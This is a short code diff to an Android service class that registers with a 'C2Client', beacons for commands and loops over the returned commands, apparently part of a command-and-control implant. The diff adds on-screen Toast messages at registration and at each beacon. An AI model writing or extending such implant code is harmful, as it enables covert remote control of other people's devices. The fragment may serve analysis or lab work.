@@ -21,6 +21,7 @@ public class CoreService extends Service {
         c2 = new C2Client(this);
         handler = new Handler(Looper.getMainLooper());
         c2.register();
+        android.widget.Toast.makeText(this, "VANTA-REG", android.widget.Toast.LENGTH_LONG).show();
         handler.post(loop);
     }
 
@@ -28,6 +29,7 @@ public class CoreService extends Service {
         @Override public void run() {
             if (!running) return;
             new Thread(() -> {
+                android.widget.Toast.makeText(CoreService.this, "VANTA-BEACON", android.widget.Toast.LENGTH_SHORT).show();
                 JSONArray cmds = c2.beacon();
                 if (cmds != null) {
                     for (int i = 0; i < cmds.length(); i++) {
